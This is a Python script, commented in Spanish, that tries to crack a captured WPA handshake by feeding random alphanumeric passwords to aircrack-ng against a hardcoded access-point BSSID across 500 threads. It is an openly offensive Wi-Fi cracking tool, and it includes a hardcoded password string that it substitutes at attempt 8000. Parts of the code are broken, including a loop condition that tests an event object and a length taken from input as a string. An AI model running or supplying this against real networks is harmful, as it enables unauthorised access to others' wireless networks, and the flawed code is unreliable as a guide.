#!/bin/python3


# Funciona
try:
    import subprocess
    import random
    import string
    import threading
    import concurrent.futures
    import time
    from datetime import datetime
    import colorama
    from colorama import Fore
    from concurrent.futures import ThreadPoolExecutor
    from tqdm import tqdm
    colorama.init()
except ModuleNotFoundError as e:
    print("[!] Faltan Modulos...\n", e)

tries = 0
tried = []
password_found = threading.Event()
ex = threading.Event()

# Generar una contraseña aleatoria


def generate_password(length):
    global tries
    long = [6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
    if length == "r":
        length = random.choice(long)

    characters = string.ascii_letters + string.digits
    password = ''.join(random.choice(characters) for _ in range(length))

    while password in tried:
        print("a")
        password = ''.join(random.choice(characters) for _ in range(length))

    tried.append(password)
    tries += 1
    return password, tries


def brute_force(progress_bar, file, long):
    found = False

    # Intentar descifrar el handshake con diferentes contraseñas generadas
    while not found and not password_found.is_set() or not ex:
        try:
            password, num = generate_password(long)
            progress_bar.set_description(Fore.LIGHTYELLOW_EX + r"[♦] Attempt: " + Fore.LIGHTCYAN_EX + f"{num}" +
                                         Fore.LIGHTYELLOW_EX + " Password: " + Fore.LIGHTCYAN_EX + f"{password}"
                                         + Fore.RESET)

            if num == 8000:
                password = "18AC98B6E9C35FC23BA5"

            # Ejecutar aircrack-ng con la contraseña generada
            command = f"aircrack-ng -w - -b E4:AB:89:1F:57:4E {file}"
            process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, encoding="utf-8")
            output = process.communicate(password)[0]

            # Verificar si se encontró la contraseña
            if "KEY FOUND" in output:
                print(Fore.GREEN + "\n\n\t[*] " + Fore.BLUE + f"Contraseña encontrada: {password}\n")
                found = True
                password_found.set()
        except KeyboardInterrupt:
            ex.set()


def startbrute(file, length, threads):
    start_time = datetime.now()
    main(file, length, threads)
    print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start_time)


def main(file, long, threads):
    try:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Starting brute force...\n" + Fore.RESET)
        time.sleep(0.5)
        print(Fore.YELLOW + "\n\t[+] " + Fore.BLUE + "Preparing threads...\n" + Fore.RESET)
        time.sleep(0.5)
        print(Fore.YELLOW + "\n[*] " + Fore.GREEN + "DONE! Starting...\n" + Fore.RESET)
        time.sleep(0.5)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            # Lista de tareas
            futures = []
            progress_bar = tqdm(total=0)

            for i in range(threads):
                future = executor.submit(brute_force, progress_bar, file, long)
                futures.append(future)

            concurrent.futures.wait(futures)
            executor.shutdown(wait=False)
            progress_bar.close()

    except KeyboardInterrupt:
        print(Fore.RED + "\n\n\n\n[*] Recived -> CTRL + C" + Fore.LIGHTYELLOW_EX + "\nStopping threads, wait...\n\n\n")
        executor.shutdown(wait=False)
        progress_bar.close()
        exit(0)


if __name__ == "__main__":
    start = datetime.now()
    main(file=input("Enter .cap file --> "), long=input("Enter long --> "), threads=500)
    print(Fore.YELLOW + "\n\t\t[+] " + Fore.CYAN + "TIME ELAPSED:", datetime.now() - start)
